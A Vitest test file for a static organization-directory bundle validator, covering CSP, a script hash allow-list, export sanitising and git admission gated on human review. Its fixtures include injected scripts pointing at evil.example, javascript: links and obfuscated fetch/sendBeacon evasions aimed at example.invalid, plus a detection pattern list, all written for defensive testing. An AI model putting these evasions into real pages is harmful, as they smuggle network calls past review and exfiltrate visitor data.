// @vitest-environment node
// Tests for the organization bundle validator, pin and admission. The bundles here are synthetic
// fixtures shaped like the canonical one; no real organization data or candidate bytes are used. The one
// exception is code: tests/fixtures/organization/directory.js is a verbatim copy of the reviewed upstream
// script, because production admission accepts only that exact hash and no test may add to the whitelist.
// Run by Vitest (`npm test`); the node:test runner in `npm test` is pinned by an operations-owned test.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { test } from 'vitest';
import {
  REVIEWED_DIRECTORY_SCRIPT_SHA256,
  SOURCE_PATH,
  admit,
  emptyPin,
  fetchUpstream,
  hashFiles,
  isAncestor,
  readBundleFromGit,
  sha256,
  validateBundle,
  validatePin,
  verifyDist,
  verifyLocal,
  writePin,
} from './organization-lib.mjs';

const SRC_SHA = 'a'.repeat(40);
const POLICY = 'b'.repeat(64);
const MAPPING = 'c'.repeat(64);
const OBSERVED = '2026-01-02T03:04:05Z';
const PNG = Buffer.concat([
  Buffer.from('89504e470d0a1a0a', 'hex'),
  Buffer.from('0000000d49484452', 'hex'),
  Buffer.alloc(13, 1),
  Buffer.from('0000000049454e44ae426082', 'hex'),
]);
const SVG =
  '<svg xmlns="http://www.w3.org/2000/svg"><style>.a{fill:#000}</style><g class="a"/></svg>';
const MMD = 'flowchart LR\n  a["A"] --> b["B"]\n';
const DIRECTORY_JS = readFileSync(
  new URL('../tests/fixtures/organization/directory.js', import.meta.url),
);

const model = () => ({
  areas: [{ id: 'alpha', name: 'Alpha', projects: [], repositories: [], teams: [] }],
  coverage: { inventory: 'complete for collector-visible data' },
  freshness_basis: 'proposed',
  freshness_threshold_seconds: 10800,
  observation: {
    completed_at: OBSERVED,
    mapping_revision: MAPPING,
    policy_revision: POLICY,
    scope: 'visible',
    source_revision: SRC_SHA,
  },
  organization: { id: 1, login: 'Pick-Your-AI', node_id: 'O_x' },
  project_roles: [],
  projects: [
    {
      closed: false,
      id: 'PVT_1',
      name: 'P',
      url: 'https://github.com/orgs/Pick-Your-AI/projects/1',
    },
  ],
  relationships: [
    { from: 'project:PVT_1', kind: 'project_link', to: 'repository:20' },
    { from: 'team:10', kind: 'access', to: 'repository:20' },
  ],
  repositories: [
    { archived: false, id: 20, name: 'Pick-Your-AI/r', url: 'https://github.com/Pick-Your-AI/r' },
  ],
  roles: [],
  routing: { notice: 'Static export.' },
  schema_version: 1,
  teams: [
    { id: 10, name: 'T', parent_id: null, url: 'https://github.com/orgs/Pick-Your-AI/teams/t' },
  ],
  unavailable_approved: { projects: [], repositories: [], teams: [] },
  unmapped: { projects: [], repositories: [], teams: [] },
});

const chartLinks = (stem) =>
  `<li><a href="${stem}.mmd">m</a> · <a href="${stem}.svg">SVG</a> · <a href="${stem}.png">PNG</a></li>`;
const INDEX = `<!doctype html>
<html lang="en">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; img-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'none'">
<title>Current organization</title>
<style>body{margin:0}</style>
<a class="skip" href="#directory">Skip</a>
<header><h1>Know where to begin.</h1></header>
<main>
<p id="freshness" data-observed="${OBSERVED}">Last observation.</p>
<h2 id="directory">Explore</h2>
<table><tbody><tr data-kind="teams"><td>team</td><th scope="row"><a href="https://github.com/orgs/Pick-Your-AI/teams/t">T</a></th><td>x</td></tr>
<tr data-kind="repositories"><td>repository</td><th scope="row"><a href="https://github.com/Pick-Your-AI/r">r</a></th><td>x</td></tr>
<tr data-kind="projects"><td>project</td><th scope="row"><a href="https://github.com/orgs/Pick-Your-AI/projects/1">P</a></th><td>x</td></tr></tbody></table>
<ul>${['overview', 'hierarchy', 'area-alpha'].map(chartLinks).join('')}</ul>
<p><a href="organization.json" download>Download</a></p>
<details><summary>Source</summary><p>Source revision: <code>${SRC_SHA}</code><br>Policy revision: <code>${POLICY}</code><br>Mapping revision: <code>${MAPPING}</code></p></details>
</main><script src="directory.js"></script></html>
`;

function bundle(mutate = () => {}) {
  const files = new Map([
    ['index.html', Buffer.from(INDEX)],
    ['directory.js', Buffer.from(DIRECTORY_JS)],
    ['organization.json', Buffer.from(JSON.stringify(model(), null, 2) + '\n')],
    ['README.md', Buffer.from(`# Current organization\n\nObservation: ${OBSERVED}\n`)],
  ]);
  for (const chart of ['overview', 'hierarchy', 'area-alpha']) {
    files.set(`${chart}.mmd`, Buffer.from(MMD));
    files.set(`${chart}.svg`, Buffer.from(SVG));
    files.set(`${chart}.png`, PNG);
  }
  mutate(files);
  return files;
}

const text = (files, name, change) =>
  files.set(name, Buffer.from(change(files.get(name).toString())));
const json = (files, change) =>
  text(files, 'organization.json', (s) => {
    const value = JSON.parse(s);
    change(value);
    return JSON.stringify(value, null, 2);
  });
const errorsOf = (files) => validateBundle(files).errors;
const rejects = (mutate, pattern) => {
  const errors = errorsOf(bundle(mutate));
  assert.ok(
    errors.some((e) => pattern.test(e)),
    `expected ${pattern}, got ${JSON.stringify(errors)}`,
  );
};

test('a complete, consistent bundle validates and reports what the host must allow', () => {
  const result = validateBundle(bundle());
  assert.deepEqual(result.errors, []);
  assert.equal(result.facts.inlineStyle, true);
  assert.deepEqual(result.facts.charts, ['overview', 'hierarchy', 'area-alpha']);
  assert.deepEqual(result.facts.counts, { teams: 1, repositories: 1, projects: 1 });
});

test('completeness: required files and paired exports', () => {
  rejects((f) => f.delete('overview.png'), /overview is missing its \.png/);
  rejects((f) => f.delete('hierarchy.mmd'), /hierarchy is missing its \.mmd/);
  rejects((f) => f.delete('area-alpha.svg'), /area-alpha is missing its \.svg/);
  rejects((f) => f.delete('directory.js'), /missing required file: directory\.js/);
  rejects((f) => f.delete('organization.json'), /missing required file: organization\.json/);
  rejects((f) => f.delete('index.html'), /missing required file: index\.html/);
  // README.md is part of the complete canonical bundle and is required, unchanged.
  rejects((f) => f.delete('README.md'), /missing required file: README\.md/);
});

test('inventory is closed: extra executable, model or chart files never reach the host', () => {
  // The P1 regression: only index.html and directory.js used to be safety-checked.
  for (const name of [
    'extra.html',
    'extra.js',
    'extra.json',
    'extra.md',
    'redirect.html',
    'sw.js',
    'worker.js',
    'organization-2.json',
    'README.txt',
  ])
    rejects((f) => f.set(name, Buffer.from('alert(1)')), /unexpected file/);
  // Chart-looking files must belong to the model: overview, hierarchy or area-<declared area id>.
  for (const stem of ['extra', 'area-unknown', 'area-alpha-2', 'overview-old', 'Area-alpha'])
    for (const ext of ['mmd', 'svg', 'png'])
      rejects(
        (f) =>
          f.set(`${stem}.${ext}`, ext === 'png' ? PNG : Buffer.from(ext === 'svg' ? SVG : MMD)),
        /unexpected file/,
      );
  // A complete extra triple is still refused.
  rejects((f) => {
    f.set('extra.mmd', Buffer.from(MMD));
    f.set('extra.svg', Buffer.from(SVG));
    f.set('extra.png', PNG);
  }, /unexpected file "extra\.(mmd|svg|png)"/);
  // Declared areas drive the expected triples: a new area without its charts, or invalid ids, fail.
  rejects(
    (f) => json(f, (m) => m.areas.push({ id: 'beta', name: 'Beta' })),
    /chart area-beta is missing its \.mmd/,
  );
  rejects(
    (f) => json(f, (m) => m.areas.push({ id: 'alpha' })),
    /area id "alpha" is invalid or duplicated/,
  );
  for (const id of ['../x', 'A', 'a b', '', 3, null])
    rejects((f) => json(f, (m) => m.areas.push({ id })), /is invalid or duplicated/);
});

test('paths: only flat, reviewed names', () => {
  for (const name of [
    '../escape.json',
    'sub/dir.json',
    '.hidden.json',
    'UPPER.json',
    'a.php',
    'x.html.js',
  ])
    rejects((f) => f.set(name, Buffer.from('{}')), /unexpected file name/);
  rejects((f) => f.set('empty.json', Buffer.alloc(0)), /empty file/);
});

test('index.html: executable or external content is refused', () => {
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('</main>', '<script>alert(1)</script></main>')),
    /exactly one external|inline script/,
  );
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace('src="directory.js"', 'src="https://evil.example/x.js"'),
      ),
    /exactly one external|outside the organization|external src/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('<h1>', '<h1 onclick="x()">')),
    /inline event handler/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('<h1>', '<h1 style="color:red">')),
    /style attribute/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('</main>', '<iframe src="x"></iframe></main>')),
    /unreviewed element <iframe>/,
  );
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace('</main>', '<img src="https://x.example/a.png"></main>'),
      ),
    /unreviewed element <img>/,
  );
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace(
          '<title>',
          '<meta http-equiv="refresh" content="0;url=https://x.example"><title>',
        ),
      ),
    /meta refresh/,
  );
  for (const target of [
    'https://example.com/overview.svg',
    'javascript:alert(1)',
    '//example.com/x',
  ])
    rejects(
      (f) => text(f, 'index.html', (s) => s.replace('href="overview.svg"', `href="${target}"`)),
      /outside the organization/,
    );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('href="overview.svg"', 'href="nope.svg"')),
    /link to missing file/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('href="#directory"', 'href="#nowhere"')),
    /dangling fragment/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('<a href="overview.png">PNG</a>', '')),
    /does not link overview\.png/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('<a href="area-alpha.png">PNG</a>', '')),
    /does not link area-alpha\.png/,
  );
});

test('index.html: CSP and accessibility basics are enforced', () => {
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'"),
      ),
    /script-src must be exactly/,
  );
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace("connect-src 'self'", 'connect-src https://x.example'),
      ),
    /remote origins/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace("style-src 'unsafe-inline'", "style-src 'self'")),
    /without matching CSP/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace(/<meta http-equiv[^>]*>/, '')),
    /embedded Content-Security-Policy/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('<html lang="en">', '<html>')),
    /lang="en"/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('<main>', '<div>').replace('</main>', '</div>')),
    /<main> landmark/,
  );
  rejects(
    (f) => text(f, 'index.html', (s) => s.replace('</header>', '<h1>again</h1></header>')),
    /exactly one <h1>/,
  );
});

test('same-revision consistency across HTML, JSON and README', () => {
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace(`data-observed="${OBSERVED}"`, 'data-observed="2020-01-01T00:00:00Z"'),
      ),
    /data-observed differs/,
  );
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace(`<code>${SRC_SHA}</code>`, `<code>${'d'.repeat(40)}</code>`),
      ),
    /Source revision differs/,
  );
  rejects(
    (f) =>
      text(f, 'index.html', (s) =>
        s.replace(`<code>${MAPPING}</code>`, `<code>${'d'.repeat(64)}</code>`),
      ),
    /Mapping revision differs/,
  );
  rejects(
    (f) => text(f, 'README.md', (s) => s.replace(OBSERVED, '2020-01-01T00:00:00Z')),
    /README\.md: Observation differs/,
  );
  rejects(
    (f) =>
      json(f, (m) =>
        m.teams.push({
          id: 11,
          name: 'U',
          parent_id: null,
          url: 'https://github.com/orgs/Pick-Your-AI/teams/u',
        }),
      ),
    /teams rows differ/,
  );
  rejects(
    (f) => json(f, (m) => (m.projects[0].url = 'https://github.com/orgs/Pick-Your-AI/projects/9')),
    /projects rows differ/,
  );
});

test('organization.json: strict shape, no personal data, no dangling references', () => {
  rejects((f) => json(f, (m) => (m.extra = 1)), /unexpected top-level keys/);
  rejects((f) => json(f, (m) => delete m.unmapped), /unexpected top-level keys/);
  rejects((f) => json(f, (m) => (m.schema_version = 2)), /unsupported schema_version/);
  rejects((f) => json(f, (m) => (m.teams[0].members = ['x'])), /forbidden key/);
  rejects((f) => json(f, (m) => (m.teams[0].email = 'x')), /forbidden key/);
  rejects((f) => json(f, (m) => (m.teams[0].login = 'someone')), /personal login/);
  rejects((f) => json(f, (m) => (m.routing.notice = 'ask someone@example.com')), /email, @mention/);
  rejects((f) => json(f, (m) => (m.routing.notice = 'ping @someone now')), /email, @mention/);
  rejects(
    (f) => json(f, (m) => (m.routing.notice = 'ghp_' + 'A'.repeat(36))),
    /email, @mention|credential/,
  );
  rejects((f) => json(f, (m) => (m.organization.login = 'Other')), /organization\.login/);
  rejects((f) => json(f, (m) => (m.observation.completed_at = 'yesterday')), /completed_at/);
  rejects((f) => json(f, (m) => (m.teams[0].url = 'https://example.com/t')), /non-canonical url/);
  rejects(
    (f) =>
      json(f, (m) => m.relationships.push({ from: 'team:999', kind: 'x', to: 'repository:20' })),
    /not in the model/,
  );
  rejects(
    (f) =>
      json(f, (m) => m.relationships.push({ from: 'person:1', kind: 'x', to: 'repository:20' })),
    /unknown type/,
  );
  rejects((f) => f.set('organization.json', Buffer.from('{not json')), /malformed JSON/);
});

// ---------------------------------------------------------------------------------------------
// The script is executed in visitors' browsers: only an exact reviewed hash is admitted.
// ---------------------------------------------------------------------------------------------

const NOT_REVIEWED = /directory\.js: sha256 [0-9a-f]{64} is not a reviewed script revision/;

test('script whitelist: the fixture is the canonical script and the list is exactly that hash', () => {
  assert.deepEqual(REVIEWED_DIRECTORY_SCRIPT_SHA256, [sha256(DIRECTORY_JS)]);
  assert.equal(
    sha256(DIRECTORY_JS),
    '8d0bf2a17fc7fd1ed9bdf32ebd992425f42afdaa85c6d328bae370e60589f813',
  );
  assert.ok(Object.isFrozen(REVIEWED_DIRECTORY_SCRIPT_SHA256));
  assert.throws(() => REVIEWED_DIRECTORY_SCRIPT_SHA256.push('0'.repeat(64)), TypeError);
  assert.deepEqual(errorsOf(bundle()), []);
});

test('script whitelist: arbitrary substitution is refused, however innocent it looks', () => {
  const substitutes = [
    "'use strict';\n",
    "'use strict';\nconst rows=[...document.querySelectorAll('tbody tr')];\nfor (const r of rows) r.hidden = false;\n",
    DIRECTORY_JS.toString() + '\n',
    DIRECTORY_JS.toString() + '// edited',
    DIRECTORY_JS.toString().replace('10800000', '10800001'),
    DIRECTORY_JS.toString().replaceAll('\n', '\r\n'),
  ];
  for (const code of substitutes)
    rejects((f) => f.set('directory.js', Buffer.from(code)), NOT_REVIEWED);
});

test('script whitelist: computed-property and obfuscated networking is refused', () => {
  // These evade the pattern scan (the P2 regression: globalThis["fetch"](...) was accepted).
  const evasions = [
    'globalThis["fetch"]("https://example.invalid/");',
    'globalThis["fe" + "tch"]("https://example.invalid/");',
    'window[["fe", "tch"].join("")]("https://example.invalid/");',
    'const f = globalThis; f[`fet${"ch"}`]("https://example.invalid/");',
    'self.navigator["send" + "Beacon"]("https://example.invalid/", "x");',
    'Reflect.get(globalThis, "fetch")("https://example.invalid/");',
    '[].constructor.constructor("return fetch")()("https://example.invalid/");',
    'document.body.append(Object.assign(document.createElement("script"), { src: "https://example.invalid/x.js" }));',
  ];
  for (const code of evasions) {
    const errors = errorsOf(bundle((f) => f.set('directory.js', Buffer.from(code))));
    assert.ok(
      errors.some((e) => NOT_REVIEWED.test(e)),
      `${code} -> ${JSON.stringify(errors)}`,
    );
  }
  // Show why the pattern scan alone is not a control: it misses at least the first computed form.
  const scanOnly = errorsOf(bundle((f) => f.set('directory.js', Buffer.from(evasions[0])))).filter(
    (e) => !NOT_REVIEWED.test(e),
  );
  assert.deepEqual(scanOnly, [], 'the supplementary pattern scan does not catch computed access');
});

test('script whitelist: the supplementary pattern scan still explains careless changes', () => {
  rejects(
    (f) => f.set('directory.js', Buffer.from(DIRECTORY_JS + '\nfetch("/x");')),
    /uses a network, storage, dynamic-code or navigation API/,
  );
  for (const code of [
    'fetch("/x")',
    'eval("1")',
    'new Function("1")',
    'localStorage.x',
    'document.write("a")',
    'el.innerHTML = x',
    'location.href = "x"',
    'navigator.sendBeacon("x")',
  ])
    rejects((f) => f.set('directory.js', Buffer.from(code)), /directory\.js: uses/);
});

test('script whitelist: no caller option, pin field or environment can extend it', () => {
  const evil = Buffer.from('globalThis["fetch"]("https://example.invalid/");');
  const files = bundle((f) => f.set('directory.js', evil));
  // validateBundle ignores any extra argument; there is no allow-list parameter.
  for (const options of [
    { scriptSha256: [sha256(evil)] },
    { allow: [sha256(evil)] },
    { complete: false },
    { reviewedScripts: [sha256(evil)] },
  ])
    assert.ok(
      validateBundle(files, options).errors.some((e) => NOT_REVIEWED.test(e)),
      JSON.stringify(options),
    );
  assert.equal(validateBundle.length, 1);
  // A pin cannot carry extra reviewed hashes either: unknown fields fail validatePin.
  const pin = admittedPin();
  pin.admitted.reviewedScripts = [sha256(evil)];
  assert.ok(validatePin(pin).some((e) => /admitted fields/.test(e)));
  // The library source has no environment-driven override.
  const lib = readFileSync(new URL('./organization-lib.mjs', import.meta.url), 'utf8');
  assert.doesNotMatch(lib, /process\.env\.[A-Z_]*(SCRIPT|SHA|ALLOW|REVIEW)/);
});

test('exports: no embedded content in SVG, complete PNG, safe Mermaid', () => {
  rejects(
    (f) => f.set('overview.svg', Buffer.from('<svg><script>1</script></svg>')),
    /overview\.svg: contains script/,
  );
  rejects(
    (f) => f.set('overview.svg', Buffer.from('<svg onload="x()"></svg>')),
    /overview\.svg: contains script/,
  );
  rejects(
    (f) => f.set('overview.svg', Buffer.from('<svg><a href="https://x.example"/></svg>')),
    /overview\.svg: contains script/,
  );
  rejects(
    (f) => f.set('overview.svg', Buffer.from('<svg><image href="data:x"/></svg>')),
    /overview\.svg: contains script/,
  );
  rejects((f) => f.set('overview.svg', Buffer.from('<html></html>')), /overview\.svg: not an SVG/);
  rejects(
    (f) => f.set('overview.png', Buffer.from('not a png at all')),
    /overview\.png: not a PNG/,
  );
  rejects(
    (f) => f.set('overview.png', PNG.subarray(0, PNG.length - 4)),
    /overview\.png: truncated PNG/,
  );
  rejects(
    (f) =>
      f.set('overview.mmd', Buffer.from('flowchart LR\n  a --> b\n  click a "https://x.example"')),
    /click\/init directive/,
  );
  rejects(
    (f) => f.set('overview.mmd', Buffer.from('sequenceDiagram\n')),
    /not a Mermaid flowchart/,
  );
  rejects(
    (f) => f.set('overview.mmd', Buffer.from('flowchart LR\n  a["@someone"]')),
    /mention, email/,
  );
  rejects((f) => f.set('overview.mmd', Buffer.from([0xff, 0xfe, 0xfd])), /not valid UTF-8/);
});

// ---------------------------------------------------------------------------------------------
// Pin
// ---------------------------------------------------------------------------------------------

const REVIEW = 'https://github.com/Pick-Your-AI/.github/pull/24#pullrequestreview-1';
const mergedApproval = () => ({
  pullRequest: 'https://github.com/Pick-Your-AI/.github/pull/24',
  humanReviewUrl: REVIEW,
  humanReviewer: 'a-human',
});
const admittedPin = (files = bundle()) => ({
  ...emptyPin(),
  admitted: {
    sourceSha: SRC_SHA,
    observedAt: OBSERVED,
    basis: 'merged-main',
    approval: mergedApproval(),
    ancestorOfMain: true,
    files: hashFiles(files),
  },
});

test('pin: the shipped state records the candidate as pending and admits nothing', () => {
  const shipped = JSON.parse(
    readFileSync(new URL('../contracts/organization/PIN.json', import.meta.url), 'utf8'),
  );
  assert.deepEqual(validatePin(shipped), []);
  assert.equal(shipped.admitted, null);
  assert.equal(shipped.candidate.eligibility, 'pending');
  assert.equal(shipped.candidate.sourceSha, '9abadb5fe22115da900dd86483c7428bc8b44b0e');
  assert.equal(existsSync(new URL('../public/organization', import.meta.url)), false);
});

test('pin: only a merged commit with recorded human review is representable', () => {
  assert.deepEqual(validatePin(admittedPin()), []);
  const bad = (mutate, pattern) => {
    const pin = admittedPin();
    mutate(pin);
    assert.ok(
      validatePin(pin).some((e) => pattern.test(e)),
      `${pattern}: ${JSON.stringify(validatePin(pin))}`,
    );
  };
  bad((p) => (p.admitted.approval = null), /merged-main approval/);
  bad((p) => (p.admitted.approval.humanReviewer = ''), /merged-main approval/);
  bad(
    (p) => (p.admitted.approval.pullRequest = 'https://example.com/pull/1'),
    /merged-main approval/,
  );
  bad((p) => (p.admitted.ancestorOfMain = false), /ancestorOfMain: true/);
  bad((p) => (p.admitted.basis = 'trust-me'), /basis must be merged-main/);
  // The unmerged owner-accepted exception was not granted and cannot be recorded.
  bad((p) => {
    p.admitted.basis = 'owner-accepted-pin';
    p.admitted.ancestorOfMain = false;
    p.admitted.approval = {
      acceptedBy: 'someone',
      acceptanceUrl: 'https://github.com/Pick-Your-AI/pick-your-ai-website/pull/1',
      acceptedAt: OBSERVED,
      reason: 'because',
    };
  }, /basis must be merged-main/);
  bad((p) => (p.admitted.sourceSha = 'main'), /full SHA/);
  bad((p) => (p.admitted.files[0].sha256 = 'zz'), /malformed file entry/);
  bad((p) => (p.admitted.files[0].publish = true), /malformed file entry/);
  bad((p) => p.admitted.files.push({ ...p.admitted.files[0] }), /duplicate file/);
  bad((p) => (p.extra = true), /unexpected or missing fields/);
  bad(
    (p) => (p.candidate = { sourceSha: SRC_SHA, eligibility: 'approved', reason: 'x' }),
    /eligibility "pending"/,
  );
  bad(
    (p) => (p.candidate = { sourceSha: SRC_SHA, eligibility: 'pending', reason: 'x' }),
    /candidate was admitted/,
  );
});

test('the importer has no unmerged or owner-exception path', () => {
  for (const file of ['./organization-lib.mjs', './organization.mjs']) {
    const source = readFileSync(new URL(file, import.meta.url), 'utf8');
    assert.doesNotMatch(source, /owner-accepted/, file);
    assert.doesNotMatch(source, /--basis|--accepted-by|--acceptance-url/, file);
  }
});

function tempRoot() {
  const root = mkdtempSync(join(tmpdir(), 'pyai-org-root-'));
  writePin(root, emptyPin());
  return root;
}
function vendor(root, files, pin) {
  const dir = join(root, 'public/organization');
  mkdirSync(dir, { recursive: true });
  for (const [name, data] of files) writeFileSync(join(dir, name), data);
  writePin(root, pin);
}

test('verifyLocal: unadmitted bytes, tampering, extras and omissions all fail closed', () => {
  const root = tempRoot();
  try {
    assert.deepEqual(verifyLocal(root).errors, []);
    const files = bundle();
    vendor(root, files, emptyPin());
    assert.match(verifyLocal(root).errors.join('\n'), /no bundle is admitted/);
    vendor(root, files, admittedPin());
    assert.deepEqual(verifyLocal(root).errors, []);
    // The complete canonical bundle is served, README.md included and unchanged.
    assert.equal(existsSync(join(root, 'public/organization/README.md')), true);

    const dir = join(root, 'public/organization');
    writeFileSync(
      join(dir, 'directory.js'),
      Buffer.concat([DIRECTORY_JS, Buffer.from('\n// edited')]),
    );
    assert.match(
      verifyLocal(root).errors.join('\n'),
      /directory\.js: differs from the pinned bytes/,
    );
    writeFileSync(join(dir, 'directory.js'), DIRECTORY_JS);
    for (const extra of ['extra.json', 'extra.js', 'extra.html']) {
      writeFileSync(join(dir, extra), '{}');
      assert.match(verifyLocal(root).errors.join('\n'), new RegExp(`${extra}: not in the pin`));
      rmSync(join(dir, extra));
    }
    rmSync(join(dir, 'overview.png'));
    assert.match(verifyLocal(root).errors.join('\n'), /overview\.png: missing/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('verifyLocal: a pin that lists an extra executable file is itself refused', () => {
  const root = tempRoot();
  try {
    const files = bundle((f) =>
      f.set('extra.js', Buffer.from('fetch("https://example.invalid/")')),
    );
    vendor(root, files, admittedPin(files));
    const errors = verifyLocal(root).errors.join('\n');
    assert.match(errors, /unexpected file "extra\.js"/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('verifyDist: the build output carries exactly the pinned bytes', () => {
  const root = tempRoot();
  try {
    const files = bundle();
    const dist = join(root, 'dist');
    assert.deepEqual(verifyDist(root, dist).errors, []);
    mkdirSync(join(dist, 'organization'), { recursive: true });
    assert.match(verifyDist(root, dist).errors.join('\n'), /no bundle is admitted/);
    writePin(root, admittedPin());
    rmSync(join(dist, 'organization'), { recursive: true });
    assert.match(verifyDist(root, dist).errors.join('\n'), /dist\/organization is missing/);
    mkdirSync(join(dist, 'organization'), { recursive: true });
    for (const [name, data] of files) writeFileSync(join(dist, 'organization', name), data);
    assert.deepEqual(verifyDist(root, dist).errors, []);
    writeFileSync(join(dist, 'organization', 'index.html'), INDEX + '<!-- stale -->');
    assert.match(verifyDist(root, dist).errors.join('\n'), /index\.html: differs/);
    writeFileSync(join(dist, 'organization', 'index.html'), INDEX);
    writeFileSync(join(dist, 'organization', 'injected.js'), 'x');
    assert.match(verifyDist(root, dist).errors.join('\n'), /injected\.js: not in the pin/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------------------------
// Git-backed admission against a throwaway local upstream (no network)
// ---------------------------------------------------------------------------------------------

const env = {
  ...process.env,
  GIT_AUTHOR_NAME: 't',
  GIT_AUTHOR_EMAIL: 't@example.invalid',
  GIT_COMMITTER_NAME: 't',
  GIT_COMMITTER_EMAIL: 't@example.invalid',
};
const git = (cwd, ...args) =>
  execFileSync('git', args, { cwd, env, stdio: ['ignore', 'pipe', 'pipe'] })
    .toString()
    .trim();

function commitBundle(repo, files, message) {
  for (const [name, data] of files) {
    const path = join(repo, SOURCE_PATH, name);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, data);
  }
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', message);
  return git(repo, 'rev-parse', 'HEAD');
}

test(
  'admission: only a commit merged into main with recorded human review is admitted',
  { timeout: 60_000 },
  () => {
    const upstream = mkdtempSync(join(tmpdir(), 'pyai-org-upstream-'));
    const root = tempRoot();
    try {
      git(upstream, 'init', '-q', '-b', 'main');
      const merged = commitBundle(upstream, bundle(), 'merged bundle');
      git(upstream, 'checkout', '-q', '-b', 'pr-branch');
      const unmerged = commitBundle(
        upstream,
        bundle((f) => text(f, 'README.md', (s) => s + '\nmore\n')),
        'unmerged bundle',
      );
      git(upstream, 'checkout', '-q', 'main');

      const fetched = fetchUpstream(merged, upstream);
      try {
        assert.equal(isAncestor(fetched.dir, merged, fetched.main), true);
        assert.equal(isAncestor(fetched.dir, unmerged, fetched.main), false);
        assert.deepEqual(readBundleFromGit(fetched.dir, merged).errors, []);
      } finally {
        fetched.cleanup();
      }

      // An unmerged commit is refused whatever approval or "basis" the caller supplies; nothing is written.
      for (const extra of [{}, { basis: 'owner-accepted-pin' }, { basis: 'merged-main' }]) {
        const refused = admit(root, {
          sha: unmerged,
          approval: mergedApproval(),
          url: upstream,
          ...extra,
        });
        assert.match(refused.errors.join('\n'), /not an ancestor|not merged/);
        assert.equal(existsSync(join(root, 'public/organization')), false);
        assert.equal(
          JSON.parse(readFileSync(join(root, 'contracts/organization/PIN.json'), 'utf8')).admitted,
          null,
        );
      }

      // Missing approval evidence is refused even for a merged commit.
      const noApproval = admit(root, { sha: merged, approval: {}, url: upstream });
      assert.match(noApproval.errors.join('\n'), /merged-main approval/);
      assert.equal(existsSync(join(root, 'public/organization')), false);

      // A merged commit with recorded human approval is admitted; every file, README included, is served.
      const ok = admit(root, { sha: merged, approval: mergedApproval(), url: upstream });
      assert.deepEqual(ok.errors, []);
      assert.deepEqual(verifyLocal(root).errors, []);
      assert.equal(existsSync(join(root, 'public/organization/index.html')), true);
      assert.equal(existsSync(join(root, 'public/organization/README.md')), true);
      const pinned = JSON.parse(
        readFileSync(join(root, 'contracts/organization/PIN.json'), 'utf8'),
      );
      assert.equal(pinned.admitted.ancestorOfMain, true);
      assert.equal(pinned.admitted.basis, 'merged-main');
      assert.equal(pinned.admitted.files.length, bundle().size);
      assert.equal(
        pinned.admitted.files.find((f) => f.path === 'index.html').sha256,
        sha256(bundle().get('index.html')),
      );
      assert.equal(
        readFileSync(join(root, 'public/organization/README.md'), 'utf8'),
        bundle().get('README.md').toString(),
      );
    } finally {
      rmSync(upstream, { recursive: true, force: true });
      rmSync(root, { recursive: true, force: true });
    }
  },
);

test('admission: a branch name or short SHA is never accepted as a source', () => {
  assert.throws(() => fetchUpstream('main'), /40-character commit SHA/);
  assert.throws(() => fetchUpstream('abc1234'), /40-character commit SHA/);
  assert.throws(() => readBundleFromGit('.', 'HEAD'), /40-character commit SHA/);
});

test(
  'admission: an invalid, extra-file or unreviewed-script bundle is refused even when merged and approved',
  { timeout: 60_000 },
  () => {
    const upstream = mkdtempSync(join(tmpdir(), 'pyai-org-upstream-'));
    const root = tempRoot();
    try {
      git(upstream, 'init', '-q', '-b', 'main');
      const cases = [
        [(f) => f.delete('overview.png'), /overview is missing its \.png/],
        [(f) => f.set('extra.js', Buffer.from('1')), /unexpected file "extra\.js"/],
        [(f) => f.set('extra.html', Buffer.from('<p>')), /unexpected file "extra\.html"/],
        [
          (f) =>
            f.set('directory.js', Buffer.from('globalThis["fetch"]("https://example.invalid/")')),
          NOT_REVIEWED,
        ],
      ];
      for (const [mutate, pattern] of cases) {
        git(upstream, 'rm', '-r', '-q', '--ignore-unmatch', SOURCE_PATH);
        rmSync(join(upstream, SOURCE_PATH), { recursive: true, force: true });
        const sha = commitBundle(upstream, bundle(mutate), 'case');
        const result = admit(root, { sha, approval: mergedApproval(), url: upstream });
        assert.match(result.errors.join('\n'), pattern);
        assert.equal(existsSync(join(root, 'public/organization')), false);
      }
    } finally {
      rmSync(upstream, { recursive: true, force: true });
      rmSync(root, { recursive: true, force: true });
    }
  },
);
